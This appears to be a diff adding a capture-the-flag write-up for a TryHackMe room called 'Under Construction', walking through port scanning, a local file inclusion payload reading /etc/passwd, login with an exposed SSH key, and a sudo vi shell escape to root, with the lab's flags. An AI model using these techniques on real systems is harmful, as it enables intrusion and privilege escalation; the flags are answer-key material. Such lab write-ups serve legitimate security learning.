@@ -574,3 +574,181 @@ root@tryhackme-2204:/tmp#
 2. **Finger Enumeration** → Leaked **`fabiano`**'s password via **`.plan`**.
 3. **SSH Login** → Gained initial shell.
 4. **Capabilities Abuse** → Used **`python3.10`**'s **`cap_setuid`** to escalate to root.
+
+## Under Construction
+
+### Description:
+
+> ZeroTrace wastes no time: one misstep in the plant's login routine, and she's in. Credentials, shells, root, factory systems fall in quick succession. 
+
+**Target IP:** **`10.10.27.251`**
+
+### Step 1: Reconnaissance (Port Scanning with Nmap)
+
+First, I scanned the target machine to identify open ports and services:
+
+```bash
+root@ip-10-10-46-202:~# nmap -sCV -p- -T4 10.10.191.157
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-29 11:30 BST
+Nmap scan report for ip-10-10-191-157.eu-west-1.compute.internal (10.10.191.157)
+Host is up (0.00022s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Industrial Dev Solutions
+MAC Address: 02:AA:E7:4C:C1:97 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds
+root@ip-10-10-46-202:~# 
+```
+
+**Findings:**
+
+- **Port 22 (SSH)** - OpenSSH 9.6p1
+- **Port 80 (HTTP)** - Apache 2.4.58 (Ubuntu)
+
+### Web Enumeration
+
+Visited **`http://10.10.27.251`** and found a simple website.
+
+Ran **`gobuster`** to find hidden directories:
+
+```bash
+root@ip-10-10-46-202:~# gobuster dir -u http://10.10.27.251 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.27.251
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 313] [--> http://10.10.27.251/assets/]
+/keys                 (Status: 301) [Size: 311] [--> http://10.10.27.251/keys/]
+/server-status        (Status: 403) [Size: 277]
+Progress: 218275 / 218276 (100.00%)
+```
+
+**Key Findings:**
+
+- **`/view.php?page=about.php`** (LFI vulnerability found)
+
+![PossibleLFI.png](/assets/images/THM/UnderConstruction/PossibleLFI.png)
+
+### Step 2: Exploiting LFI (Local File Inclusion)
+
+The **`view.php`** page had a parameter **`page`** vulnerable to LFI. Exploited by this payload: `"http://10.10.27.251/view.php?page=../../../../etc/passwd"`
+
+- LFI was confirmed - showing available users like Dev:
+
+![ConfirmedLFIandUserDEV.png](/assets/images/THM/UnderConstruction/ConfirmedLFIandUserDEV.png)
+
+### Step 3: Finding SSH Keys(Exploring `/keys/` Directory)
+
+Found an SSH private key:
+
+![Keys_Directory.png](/assets/images/THM/UnderConstruction/Keys_Directory.png)
+
+- **`/keys/`** (directory containing an SSH private key)
+
+![Key09.png](/assets/images/THM/UnderConstruction/Key09.png)
+
+Saved it as **`id_rsa`** and set permissions:
+
+```bash
+root@ip-10-10-46-202:~# nano id_rsa
+root@ip-10-10-46-202:~# chmod 600 id_rsa
+```
+
+### SSH Access
+
+Logged in as **`dev`** using the key:
+
+```bash
+root@ip-10-10-46-202:~# ssh -i id_rsa dev@10.10.27.251
+The authenticity of host '10.10.27.251 (10.10.27.251)' can't be established.
+ECDSA key fingerprint is SHA256:0DorHlp1XSJDyXeM2nQsfJCMv8z0xEZrJB0lIIVFHR0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.27.251' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-1030-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sun Jun 29 10:55:05 UTC 2025
+
+  System load:  0.01               Temperature:           -273.1 C
+  Usage of /:   16.1% of 19.31GB   Processes:             116
+  Memory usage: 13%                Users logged in:       0
+  Swap usage:   0%                 IPv4 address for ens5: 10.10.27.251
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Last login: Tue Jun 24 16:39:49 2025 from 10.13.57.153
+dev@tryhackme-2404:~$ ls
+user.txt
+dev@tryhackme-2404:~$ cat user.txt 
+THM{nic3_j0b_You_got_it_w00tw00t}
+dev@tryhackme-2404:~$ 
+
+```
+
+**Success!** Got a shell as **`dev`  and got the user flag.**
+
+### Step 4: Privilege Escalation (Checking Sudo Permissions)
+
+Ran **`sudo -l`** to see what commands **`dev`** could run:
+
+```bash
+dev@tryhackme-2404:~$ sudo -l
+Matching Defaults entries for dev on tryhackme-2404:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dev may run the following commands on tryhackme-2404:
+    (ALL) NOPASSWD: /usr/bin/vi
+dev@tryhackme-2404:~$ sudo vi -c ':!/bin/bash'
+
+^[[Iroot@tryhackme-2404:/home/dev# cd root
+bash: cd: root: No such file or directory
+root@tryhackme-2404:/home/dev# cd /root
+root@tryhackme-2404:~# cat root.txt
+THM{y0u_g0t_it_welldoneeeee}
+root@tryhackme-2404:~# 
+```
+
+### Escalating to Root via `vi`
+
+Since **`vi`** can execute shell commands, spawned a root shell that got us the root flag:
+
+```bash
+sudo vi -c ':!/bin/bash'
+```
+
+**Root Flag:** **`THM{y0u_g0t_it_welldoneeeee}`**
+
+### Vulnerabilities Exploited
+
+1. **LFI in `view.php`** → Allowed reading system files.
+2. **Exposed SSH Key** → Gained initial shell access.
+3. **Misconfigured Sudo (`vi` with NOPASSWD)** → Privilege escalation to root.
